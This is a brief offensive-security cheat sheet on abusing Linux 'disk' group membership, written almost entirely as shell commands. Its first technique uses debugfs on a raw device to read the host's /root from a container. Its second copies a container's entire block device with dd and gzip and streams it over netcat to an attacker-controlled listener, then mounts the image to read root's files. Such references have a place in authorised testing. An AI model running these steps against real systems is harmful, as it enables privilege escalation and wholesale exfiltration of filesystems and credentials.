---
title: "disk group"
date: 2024-7-2
tags: ["disk", "mount", "backup", "privilege read", "container", "lvm"]
---

### Basic

<div>

```console
# Show devices
lsblk
```

```console
# Device attributes
blkid
```

```console
# Show swap on blk
swapon -s
```

```console
# Filesystem info
cat /etc/fstab
```

</div>

<br>

---

### Abuse #1: Read host's filesystem from container (root)

<div>

```console
# Open target device
debugfs /dev/sda1
```

```console
# Exploit
ls /root
```

</div>

<br>

---

### Abuse #2: Read container's filesystem from host

<div>

```console
# Show LVM mappings
ls -l /dev/mapper/
```

```console
# In our local machine
nc -lvnp <LOCAL_PORT> > dm-0.gz
```

```console
# Exfil filesystem (target container rootfs, e.g. dm-0)
dd if=/dev/dm-0 | gzip -1 - | nc <LOCAL_IP> <LOCAL_PORT>
```

```console
# Extract dm-0
gunzip dm-0.gz
```

```console
# Mount the filesystem
sudo mount dm-0-orig /mnt/ 
```

```console
# Privilege read
ls /mnt/root/
```

<small>*Note: can take a long time to transfer*</small>

</div>

<br>